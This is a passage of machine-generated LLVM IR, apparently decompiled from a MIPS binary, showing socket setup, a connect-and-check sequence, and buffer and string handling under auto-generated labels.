  %v2_40306c = or i32 %v2_403064, %v1_403058
  store i32 %v2_40306c, i32* %v1.global-to-local, align 4
  %v1_403070 = load i32, i32* @s3, align 4
  %v2_403070 = inttoptr i32 %v1_403070 to i32*
  store i32 %v2_40306c, i32* %v2_403070, align 4
  %v0_403074.pre = load i32, i32* @s3, align 4
  br label %dec_label_pc_403074

dec_label_pc_403074:                              ; preds = %dec_label_pc_402e68, %dec_label_pc_403034
  %v0_403074 = phi i32 [ %v0_402e90, %dec_label_pc_402e68 ], [ %v0_403074.pre, %dec_label_pc_403034 ]
  %v1_403074 = add i32 %v0_403074, 4
  %v2_403074 = inttoptr i32 %v1_403074 to i16*
  %v3_403074 = load i16, i16* %v2_403074, align 2
  %v4_403074 = zext i16 %v3_403074 to i32
  store i32 %v4_403074, i32* %v1.global-to-local, align 4
  %v1_403078 = inttoptr i32 %v0_403074 to i32*
  %v2_403078 = load i32, i32* %v1_403078, align 4
  store i32 %v2_403078, i32* %a0.global-to-local, align 4
  %v0_40307c = load i32, i32* %gp.global-to-local, align 4
  %v1_40307c = add i32 %v0_40307c, -32188
  %v2_40307c = inttoptr i32 %v1_40307c to i32*
  %v3_40307c = load i32, i32* %v2_40307c, align 4
  store i32 2, i32* %v0.global-to-local, align 4
  store i32 2, i32* %stack_var_-2312, align 4
  store i32 2, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_40307c)
  store i32 -1, i32* %s1.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v0_4030a8 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_4030a8, i32* @s0, align 4
  %v2_4030ac = icmp eq i32 %v0_4030a8, -1
  %v4_4030ac = load i32, i32* @s3, align 4
  %v5_4030ac = add i32 %v4_4030ac, 8
  %v6_4030ac = inttoptr i32 %v5_4030ac to i32*
  store i32 %v0_4030a8, i32* %v6_4030ac, align 4
  br i1 %v2_4030ac, label %dec_label_pc_403cb0, label %dec_label_pc_4030b0

dec_label_pc_4030b0:                              ; preds = %dec_label_pc_403074
  %v3_4030b4 = load i32, i32* @global_var_449b24.80, align 4
  store i32 %v3_4030b4, i32* @t9, align 4
  store i32 3, i32* @a1, align 4
  %v1_4030c0 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v1_4030c0, i32* @a0, align 4
  %v2_4030c0 = call i32 @function_404c80()
  store i32 %v2_4030c0, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v0_4030cc = load i32, i32* @s0, align 4
  store i32 %v0_4030cc, i32* @a0, align 4
  %v3_4030d0 = load i32, i32* @global_var_449b24.80, align 4
  store i32 %v3_4030d0, i32* @t9, align 4
  store i32 4, i32* @a1, align 4
  %v1_4030d8 = call i32 @function_404c80()
  store i32 %v1_4030d8, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v0_4030e4 = load i32, i32* @s3, align 4
  %v1_4030e4 = add i32 %v0_4030e4, 8
  %v2_4030e4 = inttoptr i32 %v1_4030e4 to i32*
  %v3_4030e4 = load i32, i32* %v2_4030e4, align 4
  store i32 %v3_4030e4, i32* %a0.global-to-local, align 4
  %v3_4030e8 = load i32, i32* @global_var_449d10.86, align 4
  store i32 %v3_4030e8, i32* @t9, align 4
  store i32 16, i32* @a2, align 4
  %v4_4030f0 = bitcast i32* %stack_var_-2312 to %sockaddr*
  %v5_4030f0 = call i32 @function_405cb0(i32 %v3_4030e4, %sockaddr* %v4_4030f0)
  store i32 %v5_4030f0, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v1_4030fc = load i32, i32* %s1.global-to-local, align 4
  %v2_4030fc = icmp eq i32 %v5_4030f0, %v1_4030fc
  %v3_4030fc = load i32, i32* @s3, align 4
  store i32 %v3_4030fc, i32* %a0.global-to-local, align 4
  br i1 %v2_4030fc, label %dec_label_pc_403100, label %dec_label_pc_40312c

dec_label_pc_403100:                              ; preds = %dec_label_pc_4030b0
  %v3_403104 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_403104, i32* @t9, align 4
  %v1_40310c = call i32 @function_4057a0()
  store i32 %v1_40310c, i32* %v0.global-to-local, align 4
  %v1_403114 = inttoptr i32 %v1_40310c to i32*
  %v2_403114 = load i32, i32* %v1_403114, align 4
  store i32 %v2_403114, i32* %v1.global-to-local, align 4
  store i32 150, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v2_403120 = icmp eq i32 %v2_403114, 150
  br i1 %v2_403120, label %dec_label_pc_403124, label %dec_label_pc_403c68

dec_label_pc_403124:                              ; preds = %dec_label_pc_403100
  %v0_403128 = load i32, i32* @s3, align 4
  store i32 %v0_403128, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_40312c

dec_label_pc_40312c:                              ; preds = %dec_label_pc_4030b0, %dec_label_pc_403124
  %v2_403134 = ptrtoint i32* %stack_var_-2244 to i32
  store i32 %v2_403134, i32* %v0.global-to-local, align 4
  %v2_40313c = ptrtoint i32* %stack_var_-2116 to i32
  store i32 %v2_40313c, i32* %v1.global-to-local, align 4
  %v5_403148 = ptrtoint i32* %stack_var_-2336 to i32
  br label %dec_label_pc_403140

dec_label_pc_403140:                              ; preds = %dec_label_pc_403140, %dec_label_pc_40312c
  %v0_403140 = phi i32 [ %v1_403144, %dec_label_pc_403140 ], [ %v2_403134, %dec_label_pc_40312c ]
  %v1_403140 = inttoptr i32 %v0_403140 to i32*
  store i32 0, i32* %v1_403140, align 4
  %v0_403144 = load i32, i32* %v0.global-to-local, align 4
  %v1_403144 = add i32 %v0_403144, 4
  store i32 %v1_403144, i32* %v0.global-to-local, align 4
  %v1_403148 = load i32, i32* %v1.global-to-local, align 4
  %v2_403148 = icmp eq i32 %v1_403144, %v1_403148
  store i32 %v5_403148, i32* @s1, align 4
  br i1 %v2_403148, label %dec_label_pc_40314c, label %dec_label_pc_403140

dec_label_pc_40314c:                              ; preds = %dec_label_pc_403140
  %v0_403150 = load i32, i32* @s3, align 4
  %v1_403150 = add i32 %v0_403150, 8
  %v2_403150 = inttoptr i32 %v1_403150 to i32*
  %v3_403150 = load i32, i32* %v2_403150, align 4
  store i32 %v3_403150, i32* %a0.global-to-local, align 4
  %v1_403158 = udiv i32 %v3_403150, 32
  %v1_40315c = mul nuw nsw i32 %v1_403158, 4
  %v2_403160 = add i32 %v1_40315c, %v5_403148
  store i32 %v2_403160, i32* %v1.global-to-local, align 4
  %v1_403164 = add i32 %v2_403160, 92
  %v2_403164 = inttoptr i32 %v1_403164 to i32*
  %v3_403164 = load i32, i32* %v2_403164, align 4
  store i32 1, i32* @s0, align 4
  %v2_40316c = shl i32 1, %v3_403150
  %v2_403170 = or i32 %v3_403164, %v2_40316c
  %v3_403178 = load i32, i32* @global_var_449ca0.122, align 4
  store i32 %v3_403178, i32* @t9, align 4
  %v2_403180 = ptrtoint i32* %stack_var_-2328 to i32
  store i32 %v2_403180, i32* %v0.global-to-local, align 4
  store i32 %v2_403170, i32* %v2_403164, align 4
  store i32 0, i32* %stack_var_-2328, align 4
  %v0_403190 = load i32, i32* %a0.global-to-local, align 4
  %v1_403190 = add i32 %v0_403190, 1
  store i32 %v1_403190, i32* %a0.global-to-local, align 4
  %v4_403198 = call i32 @function_4051d0(i32 %v1_403190, i32 0, i32 0)
  store i32 %v4_403198, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v1_4031a4 = load i32, i32* @s0, align 4
  %v2_4031a4 = icmp eq i32 %v4_403198, %v1_4031a4
  store i32 %v2_403180, i32* %v1.global-to-local, align 4
  br i1 %v2_4031a4, label %dec_label_pc_4031a8, label %dec_label_pc_40322c.thread

dec_label_pc_40322c.thread:                       ; preds = %dec_label_pc_40314c
  store i32 -1, i32* %v0.global-to-local, align 4
  %v0_403238.pre = load i32, i32* @s3, align 4
  br label %dec_label_pc_403234

dec_label_pc_4031a8:                              ; preds = %dec_label_pc_40314c
  store i32 4, i32* %v0.global-to-local, align 4
  %v0_4031b0 = load i32, i32* @s3, align 4
  %v1_4031b0 = add i32 %v0_4031b0, 8
  %v2_4031b0 = inttoptr i32 %v1_4031b0 to i32*
  %v3_4031b0 = load i32, i32* %v2_4031b0, align 4
  store i32 %v3_4031b0, i32* %a0.global-to-local, align 4
  %v3_4031b4 = load i32, i32* @global_var_449b90.108, align 4
  store i32 %v3_4031b4, i32* @t9, align 4
  store i32 4, i32* %stack_var_-2332, align 4
  %v2_4031bc = ptrtoint i32* %stack_var_-2332 to i32
  store i32 %v2_4031bc, i32* %v0.global-to-local, align 4
  store i32 0, i32* %stack_var_-2336, align 4
  store i32 %v5_403148, i32* @a3, align 4
  %v6_4031d0 = call i32 @function_405d70(i32 %v3_4031b0, i32 65535, i32 4103)
  %v3_4031d8 = load i32, i32* %stack_var_-2336, align 4
  store i32 %v3_4031d8, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v1_4031e0 = icmp eq i32 %v3_4031d8, 0
  br i1 %v1_4031e0, label %dec_label_pc_40322c, label %dec_label_pc_403c68

dec_label_pc_40322c:                              ; preds = %dec_label_pc_4031a8
  %v0_4031e8 = load i32, i32* @s3, align 4
  %v1_4031e8 = add i32 %v0_4031e8, 8
  %v2_4031e8 = inttoptr i32 %v1_4031e8 to i32*
  %v3_4031e8 = load i32, i32* %v2_4031e8, align 4
  store i32 %v3_4031e8, i32* @s0, align 4
  %v3_4031ec = load i32, i32* @global_var_449b24.80, align 4
  store i32 %v3_4031ec, i32* @t9, align 4
  store i32 %v3_4031e8, i32* @a0, align 4
  store i32 3, i32* @a1, align 4
  %v1_4031f8 = call i32 @function_404c80()
  store i32 %v1_4031f8, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v3_403208 = load i32, i32* @global_var_449b24.80, align 4
  store i32 %v3_403208, i32* @t9, align 4
  %v0_40320c = load i32, i32* @s0, align 4
  store i32 %v0_40320c, i32* @a0, align 4
  store i32 4, i32* @a1, align 4
  %v4_403214 = call i32 @function_404c80()
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v0_403220 = load i32, i32* @s3, align 4
  store i32 %v0_403220, i32* %a0.global-to-local, align 4
  %v0_403230.pr = load i32, i32* @v1, align 4
  store i32 -1, i32* %v0.global-to-local, align 4
  %v2_403230 = icmp eq i32 %v0_403230.pr, -1
  br i1 %v2_403230, label %dec_label_pc_403c68, label %dec_label_pc_403234

dec_label_pc_403234:                              ; preds = %dec_label_pc_40322c.thread, %dec_label_pc_40322c
  %v3_403284 = phi i32 [ %v0_403238.pre, %dec_label_pc_40322c.thread ], [ %v0_403220, %dec_label_pc_40322c ]
  store i32 %v3_403284, i32* %a0.global-to-local, align 4
  %v0_403248 = load i32, i32* @s6, align 4
  %v2_403248 = icmp eq i32 %v0_403248, 2
  store i32 3, i32* %v0.global-to-local, align 4
  br i1 %v2_403248, label %dec_label_pc_40325c.thread, label %dec_label_pc_40325c

dec_label_pc_40325c.thread:                       ; preds = %dec_label_pc_403234
  store i32 %v3_403284, i32* %a0.global-to-local, align 4
  store i32 1, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_403270.thread

dec_label_pc_40325c:                              ; preds = %dec_label_pc_403234
  %v2_40325c = icmp eq i32 %v0_403248, 3
  store i32 1, i32* %v0.global-to-local, align 4
  br i1 %v2_40325c, label %dec_label_pc_403260, label %dec_label_pc_403270

dec_label_pc_403260:                              ; preds = %dec_label_pc_40325c
  store i32 %v3_403284, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_403270.thread

dec_label_pc_403270.thread:                       ; preds = %dec_label_pc_40325c.thread, %dec_label_pc_403260
  store i32 4, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_403284.thread

dec_label_pc_403270:                              ; preds = %dec_label_pc_40325c
  %v2_403270 = icmp eq i32 %v0_403248, 1
  store i32 4, i32* %v0.global-to-local, align 4
  br i1 %v2_403270, label %dec_label_pc_403274, label %dec_label_pc_403284

dec_label_pc_403274:                              ; preds = %dec_label_pc_403270
  store i32 %v3_403284, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_403284.thread

dec_label_pc_403284.thread:                       ; preds = %dec_label_pc_403270.thread, %dec_label_pc_403274
  store i32 %v3_403284, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_403294

dec_label_pc_403284:                              ; preds = %dec_label_pc_403270
  %v2_403284 = icmp eq i32 %v0_403248, 4
  store i32 %v3_403284, i32* %a0.global-to-local, align 4
  br i1 %v2_403284, label %dec_label_pc_403288, label %dec_label_pc_403294

dec_label_pc_403288:                              ; preds = %dec_label_pc_403284
  br label %dec_label_pc_403294

dec_label_pc_403294:                              ; preds = %dec_label_pc_403284.thread, %dec_label_pc_403284, %dec_label_pc_402d70, %dec_label_pc_402950, %dec_label_pc_403288
  %stack_var_-48.1 = phi i32 [ %tmp70, %dec_label_pc_402950 ], [ %stack_var_-48.0, %dec_label_pc_403288 ], [ %stack_var_-48.0, %dec_label_pc_403284 ], [ %tmp70, %dec_label_pc_402d70 ], [ %stack_var_-48.0, %dec_label_pc_403284.thread ]
  %stack_var_-64.1 = phi i32 [ %tmp76, %dec_label_pc_402950 ], [ %stack_var_-64.0, %dec_label_pc_403288 ], [ %stack_var_-64.0, %dec_label_pc_403284 ], [ %tmp76, %dec_label_pc_402d70 ], [ %stack_var_-64.0, %dec_label_pc_403284.thread ]
  %stack_var_-56.3 = phi i32 [ %tmp77, %dec_label_pc_402950 ], [ %stack_var_-56.2, %dec_label_pc_403288 ], [ %stack_var_-56.2, %dec_label_pc_403284 ], [ %stack_var_-56.0, %dec_label_pc_402d70 ], [ %stack_var_-56.2, %dec_label_pc_403284.thread ]
  %stack_var_-52.3 = phi i32 [ %tmp78, %dec_label_pc_402950 ], [ %stack_var_-52.2, %dec_label_pc_403288 ], [ %stack_var_-52.2, %dec_label_pc_403284 ], [ %stack_var_-52.0, %dec_label_pc_402d70 ], [ %stack_var_-52.2, %dec_label_pc_403284.thread ]
  %v1_403294 = add i32 %v1_4028f0, 291456
  %v2_403294 = inttoptr i32 %v1_403294 to i32*
  %v3_403294 = load i32, i32* %v2_403294, align 4
  store i32 0, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_403294)
  %v0_4032a4 = load i32, i32* @s3, align 4
  %v1_4032a4 = add i32 %v0_4032a4, 17
  %v2_4032a4 = inttoptr i32 %v1_4032a4 to i8*
  %v3_4032a4 = load i8, i8* %v2_4032a4, align 1
  %v4_4032a4 = zext i8 %v3_4032a4 to i32
  store i32 %v4_4032a4, i32* %v1.global-to-local, align 4
  %v2_4032ac = icmp eq i8 %v3_4032a4, 2
  store i32 3, i32* @v0, align 4
  br i1 %v2_4032ac, label %dec_label_pc_4032c0.thread, label %dec_label_pc_4032c0

dec_label_pc_4032c0.thread:                       ; preds = %dec_label_pc_403294
  store i32 %v0_4032a4, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_4032d4

dec_label_pc_4032c0:                              ; preds = %dec_label_pc_403294
  %v2_4032c0 = icmp eq i8 %v3_4032a4, 3
  br i1 %v2_4032c0, label %dec_label_pc_4032c4, label %dec_label_pc_4032d4

dec_label_pc_4032c4:                              ; preds = %dec_label_pc_4032c0
  store i32 %v0_4032a4, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_4032d4

dec_label_pc_4032d4:                              ; preds = %dec_label_pc_4032c0.thread, %dec_label_pc_4032c0, %dec_label_pc_4032c4
  %v0_4032d4 = load i32, i32* %gp.global-to-local, align 4
  %v1_4032d8 = add i32 %v0_4032d4, -32224
  %v2_4032d8 = inttoptr i32 %v1_4032d8 to i32*
  %v3_4032d8 = load i32, i32* %v2_4032d8, align 4
  %v1_4032dc = add i32 %v0_4032a4, 8
  %v2_4032dc = inttoptr i32 %v1_4032dc to i32*
  %v3_4032dc = load i32, i32* %v2_4032dc, align 4
  store i32 %v3_4032dc, i32* %a0.global-to-local, align 4
  store i32 16384, i32* @a3, align 4
  call void @__pseudo_call(i32 %v3_4032d8)
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v0_4032f0 = load i32, i32* @v0, align 4
  %v1_4032f0 = icmp slt i32 %v0_4032f0, 1
  br i1 %v1_4032f0, label %dec_label_pc_403c68, label %dec_label_pc_4032f4

dec_label_pc_4032f4:                              ; preds = %dec_label_pc_4032d4
  %v0_4032f8 = load i32, i32* @s3, align 4
  %v3_403308 = load i32, i32* @global_var_449a80.88, align 4
  %v1_403310 = add i32 %v3_403308, 9792
  store i32 %v0_4032f8, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_403310)
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v0_403320 = load i32, i32* @v0, align 4
  %v1_403320 = icmp eq i32 %v0_403320, 0
  store i32 %v0_403320, i32* %s5.global-to-local, align 4
  br i1 %v1_403320, label %dec_label_pc_4032f4.dec_label_pc_403894_crit_edge, label %dec_label_pc_403324

dec_label_pc_4032f4.dec_label_pc_403894_crit_edge: ; preds = %dec_label_pc_4032f4
  %v0_403894.pre = load i32, i32* @s3, align 4
  %.pre = ptrtoint i32* %stack_var_-1092 to i32
  br label %dec_label_pc_403894

dec_label_pc_403324:                              ; preds = %dec_label_pc_4032f4
  %v3_403328 = load i32, i32* @global_var_449c5c.121, align 4
  store i32 %v3_403328, i32* @t9, align 4
  store i32 4, i32* %a0.global-to-local, align 4
  %v5_403330 = call i32 @function_4063f0(i64 4, i32 4)
  store i32 %v5_403330, i32* @v0, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v0_40333c = load i32, i32* @s3, align 4
  %v1_40333c = add i32 %v0_40333c, 18
  store i32 %v1_40333c, i32* %s2.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_40960c.157 to i32), i32* %v1.global-to-local, align 4
  %v2_40335c = add i32 %v0_40333c, 1044
  %v3_40335c = inttoptr i32 %v2_40335c to i32*
  store i32 %v5_403330, i32* %v3_40335c, align 4
  %v0_403360 = load i32, i32* %s2.global-to-local, align 4
  store i32 %v0_403360, i32* %a0.global-to-local, align 4
  store i8 4, i8* %stack_var_-2320, align 1
  %v5_403368 = call i32 @function_403f48()
  store i32 %v5_403368, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  store i32 %v0_403360, i32* %a0.global-to-local, align 4
  %v3_403378 = load i32, i32* @global_var_449cf8.124, align 4
  store i32 %v3_403378, i32* @t9, align 4
  %v2_403380 = load i32, i32* %s5.global-to-local, align 4
  %v3_403380 = add i32 %v2_403380, %v0_403360
  %v7_403380 = call i32 @function_4058c0(i32 %v0_403360, i32 %v3_403380, i32 %v5_403368)
  store i32 %v7_403380, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v2_403390 = ptrtoint i8* %stack_var_-2320 to i32
  store i32 %v2_403390, i32* %s4.global-to-local, align 4
  %v4_4033c8 = ptrtoint i32* %stack_var_-2312 to i32
  %v0_403394.pre = load i32, i32* @s0, align 4
  br label %dec_label_pc_403394

dec_label_pc_403394:                              ; preds = %dec_label_pc_4033bc, %dec_label_pc_403324
  %v0_4033ac = phi i32 [ %v1_4033c0, %dec_label_pc_4033bc ], [ %v0_403394.pre, %dec_label_pc_403324 ]
  %v1_403394 = inttoptr i32 %v0_4033ac to i8*
  %v2_403394 = load i8, i8* %v1_403394, align 1
  %v3_403394 = sext i8 %v2_403394 to i32
  store i32 %v3_403394, i32* %v1.global-to-local, align 4
  %v2_403398 = load i8, i8* %stack_var_-2320, align 1
  %v3_403398 = sext i8 %v2_403398 to i32
  store i32 %v3_403398, i32* %v0.global-to-local, align 4
  %v2_4033a0 = icmp eq i8 %v2_403394, %v2_403398
  store i32 %v0_4033ac, i32* %a0.global-to-local, align 4
  br i1 %v2_4033a0, label %dec_label_pc_4033a4, label %dec_label_pc_4033bc

dec_label_pc_4033a4:                              ; preds = %dec_label_pc_403394
  %v3_4033a8 = load i32, i32* @global_var_449cf8.124, align 4
  store i32 %v3_4033a8, i32* @t9, align 4
  %v1_4033ac = add i32 %v0_4033ac, 1
  %v1_4033b0 = load i32, i32* %s5.global-to-local, align 4
  %v2_4033b0 = load i32, i32* @s1, align 4
  %v3_4033b0 = sub i32 %v1_4033b0, %v2_4033b0
  %v7_4033b0 = call i32 @function_4058c0(i32 %v0_4033ac, i32 %v1_4033ac, i32 %v3_4033b0)
  store i32 %v7_4033b0, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v0_4033c0.pre = load i32, i32* @s0, align 4
  br label %dec_label_pc_4033bc

dec_label_pc_4033bc:                              ; preds = %dec_label_pc_403394, %dec_label_pc_4033a4
  %v0_4033c0 = phi i32 [ %v0_4033ac, %dec_label_pc_403394 ], [ %v0_4033c0.pre, %dec_label_pc_4033a4 ]
  %v0_4033bc = load i32, i32* @s1, align 4
  %v1_4033bc = add i32 %v0_4033bc, 1
  store i32 %v1_4033bc, i32* @s1, align 4
  %v1_4033c0 = add i32 %v0_4033c0, 1
  store i32 %v1_4033c0, i32* @s0, align 4
  %v1_4033c4 = load i32, i32* %s5.global-to-local, align 4
  %v2_4033c4 = icmp slt i32 %v1_4033bc, %v1_4033c4
  store i32 %v4_4033c8, i32* @v0, align 4
  br i1 %v2_4033c4, label %dec_label_pc_403394, label %dec_label_pc_4033e8

dec_label_pc_4033e8:                              ; preds = %dec_label_pc_4033bc
  %v2_4033d0 = ptrtoint i32* %stack_var_-2319 to i32
  store i32 %v2_4033d0, i32* %s4.global-to-local, align 4
  %v3_4033d4 = load i32, i32* %s2.global-to-local, align 4
  store i32 %v3_4033d4, i32* %s0.global-to-local, align 4
  store i32 0, i32* @s1, align 4
  %v0_4033f0.pre = load i32, i32* @t9, align 4
  br label %dec_label_pc_4033f0

dec_label_pc_4033f0:                              ; preds = %dec_label_pc_4033f0.dec_label_pc_4033f0_crit_edge, %dec_label_pc_4033e8
  %v2_4033f0 = phi i32 [ %v3_403470, %dec_label_pc_4033f0.dec_label_pc_4033f0_crit_edge ], [ %v4_4033c8, %dec_label_pc_4033e8 ]
  %v1_4033f0 = phi i32 [ %v1_4033f0.pre, %dec_label_pc_4033f0.dec_label_pc_4033f0_crit_edge ], [ %v2_4033d0, %dec_label_pc_4033e8 ]
  %v0_4033f0 = phi i32 [ %v3_40346c, %dec_label_pc_4033f0.dec_label_pc_4033f0_crit_edge ], [ %v0_4033f0.pre, %dec_label_pc_4033e8 ]
  %v3_4033f0 = add i32 %v1_4033f0, %v2_4033f0
  store i32 %v3_4033f0, i32* @s0, align 4
  call void @__pseudo_call(i32 %v0_4033f0)
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v0_4033fc = load i32, i32* @v0, align 4
  %v1_4033fc = add i32 %v0_4033fc, 1
  store i32 %v1_4033fc, i32* %a0.global-to-local, align 4
  %v3_403400 = load i32, i32* @global_var_449cb8.14, align 4
  store i32 %v3_403400, i32* @t9, align 4
  store i32 0, i32* @s2, align 4
  %v2_403408 = call i32 @function_406200(i32 %v1_4033fc)
  store i32 %v2_403408, i32* @v0, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v0_403414 = load i32, i32* @s3, align 4
  %v1_403414 = add i32 %v0_403414, 1044
  %v2_403414 = inttoptr i32 %v1_403414 to i32*
  %v3_403414 = load i32, i32* %v2_403414, align 4
  %v1_40341c = load i32, i32* %s4.global-to-local, align 4
  %v2_40341c = add i32 %v1_40341c, %v3_403414
  store i32 %v2_40341c, i32* %v1.global-to-local, align 4
  %v1_403420 = load i32, i32* @s0, align 4
  %v2_403420 = inttoptr i32 %v1_403420 to i32*
  store i32 %v2_403408, i32* %v2_403420, align 4
  %v0_403424 = load i32, i32* %v1.global-to-local, align 4
  %v1_403424 = inttoptr i32 %v0_403424 to i32*
  %v2_403424 = load i32, i32* %v1_403424, align 4
  store i32 %v2_403424, i32* %s0.global-to-local, align 4
  %v1_403428 = load i32, i32* @s1, align 4
  store i32 %v1_403428, i32* %a0.global-to-local, align 4
  %v2_403428 = call i32 @function_403f48()
  store i32 %v2_403428, i32* @v0, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v0_403434 = load i32, i32* %s0.global-to-local, align 4
  store i32 %v0_403434, i32* %a0.global-to-local, align 4
  %v0_40343c = load i32, i32* @s1, align 4
  store i32 %v2_403428, i32* @a2, align 4
  %v5_403440 = call i32 @function_403fa0(i32 %v0_403434, i32 %v0_40343c, i32 %v2_403428)
  store i32 %v5_403440, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v0_40344c = load i32, i32* %s4.global-to-local, align 4
  %v1_40344c = add i32 %v0_40344c, 4
  store i32 %v1_40344c, i32* %s4.global-to-local, align 4
  %v3_403454 = load i32, i32* @global_var_449cb4.159, align 4
  store i32 %v3_403454, i32* @t9, align 4
  %v0_403458 = load i32, i32* @s2, align 4
  store i32 %v0_403458, i32* @a0, align 4
  %v5_40345c = inttoptr i32 %v0_403458 to i8*
  %v6_40345c = call i32 @function_40405c(i8* %v5_40345c, i32 ptrtoint (i32* @global_var_408780.160 to i32))
  store i32 %v6_40345c, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  store i32 %v6_40345c, i32* @s1, align 4
  %v3_40346c = load i32, i32* @global_var_449c3c.52, align 4
  %v0_403470 = load i32, i32* @s3, align 4
  %v1_403470 = add i32 %v0_403470, 1044
  %v2_403470 = inttoptr i32 %v1_403470 to i32*
  %v3_403470 = load i32, i32* %v2_403470, align 4
  store i32 %v3_403470, i32* @v0, align 4
  %v1_403474 = icmp eq i32 %v6_40345c, 0
  store i32 %v6_40345c, i32* %a0.global-to-local, align 4
  br i1 %v1_403474, label %dec_label_pc_403478, label %dec_label_pc_4033f0.dec_label_pc_4033f0_crit_edge

dec_label_pc_4033f0.dec_label_pc_4033f0_crit_edge: ; preds = %dec_label_pc_4033f0
  %v1_4033f0.pre = load i32, i32* %s4.global-to-local, align 4
  br label %dec_label_pc_4033f0

dec_label_pc_403478:                              ; preds = %dec_label_pc_4033f0
  %v1_40347c = add i32 %v3_403470, 4
  %v2_40347c = inttoptr i32 %v1_40347c to i32*
  %v3_40347c = load i32, i32* %v2_40347c, align 4
  store i32 %v3_40347c, i32* @s0, align 4
  store i32 %v3_40347c, i32* %a0.global-to-local, align 4
  %v2_403480 = call i32 @function_403f48()
  store i32 %v2_403480, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v0_40348c = load i32, i32* @s0, align 4
  store i32 %v0_40348c, i32* %a0.global-to-local, align 4
  %v3_403490 = load i32, i32* @global_var_449cf8.124, align 4
  store i32 %v3_403490, i32* @t9, align 4
  %v2_403498 = add i32 %v0_40348c, 12
  %v6_403498 = call i32 @function_4058c0(i32 %v0_40348c, i32 %v2_403498, i32 %v2_403480)
  store i32 %v6_403498, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v0_4034a4 = load i32, i32* @s3, align 4
  %v1_4034a4 = add i32 %v0_4034a4, 1044
  %v2_4034a4 = inttoptr i32 %v1_4034a4 to i32*
  %v3_4034a4 = load i32, i32* %v2_4034a4, align 4
  store i32 %v3_4034a4, i32* %v0.global-to-local, align 4
  %v3_4034a8 = load i32, i32* @global_var_449a80.88, align 4
  store i32 %v3_4034a8, i32* %v1.global-to-local, align 4
  %v1_4034ac = icmp eq i32 %v3_4034a4, 0
  br i1 %v1_4034ac, label %dec_label_pc_403478.dec_label_pc_403b70_crit_edge, label %dec_label_pc_4034b0

dec_label_pc_403478.dec_label_pc_403b70_crit_edge: ; preds = %dec_label_pc_403478
  %.pre61 = ptrtoint i32* %stack_var_-1092 to i32
  br label %dec_label_pc_403b70

dec_label_pc_4034b0:                              ; preds = %dec_label_pc_403478
  %v2_4034c0 = ptrtoint i32* %stack_var_-1092 to i32
  store i32 1024, i32* @a2, align 4
  store i32 %v2_4034c0, i32* @a0, align 4
  %v6_4034cc = call i32 @function_404030(i32 %v2_4034c0, i32 0, i32 1024)
  store i32 %v6_4034cc, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  store i32 %v2_4034c0, i32* %a0.global-to-local, align 4
  %v3_4034e0 = load i32, i32* @global_var_449b78.59, align 4
  store i32 %v3_4034e0, i32* @t9, align 4
  %v7_4034e8 = bitcast i32* %stack_var_-1092 to i8*
  %v8_4034e8 = call i32 @function_403fcc(i8* %v7_4034e8, i32 ptrtoint ([27 x i8]* @global_var_408784.161 to i32))
  store i32 %v8_4034e8, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v0_4034f4 = load i32, i32* @s3, align 4
  %v1_4034f4 = add i32 %v0_4034f4, 1044
  %v2_4034f4 = inttoptr i32 %v1_4034f4 to i32*
  %v3_4034f4 = load i32, i32* %v2_4034f4, align 4
  store i32 %v3_4034f4, i32* %v0.global-to-local, align 4
  %v1_4034fc = inttoptr i32 %v3_4034f4 to i32*
  %v2_4034fc = load i32, i32* %v1_4034fc, align 4
  store i32 %v2_4034fc, i32* @a1, align 4
  store i32 %v2_4034c0, i32* %a0.global-to-local, align 4
  %v6_403500 = call i32 @function_403f6c(i8* %v7_4034e8, i32 %v2_4034fc)
  store i32 %v6_403500, i32* %v0.global-to-local, align 4
